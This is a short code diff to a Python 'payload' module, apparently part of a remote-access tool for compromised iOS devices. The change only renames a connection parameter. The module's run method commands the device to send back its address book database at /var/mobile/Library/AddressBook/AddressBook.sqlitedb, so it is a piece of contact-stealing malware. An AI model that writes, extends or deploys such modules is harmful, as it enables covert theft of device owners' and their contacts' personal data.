@@ -5,6 +5,6 @@ class payload:
         self.type = "download"
         self.id = 121
 
-    def run(self,conn,server,command):
-        server.sendCommand("download","/var/mobile/Library/AddressBook/AddressBook.sqlitedb","download",conn)
+    def run(self,session,server,command):
+        server.sendCommand("download","/var/mobile/Library/AddressBook/AddressBook.sqlitedb","download",session.conn)
         return ""
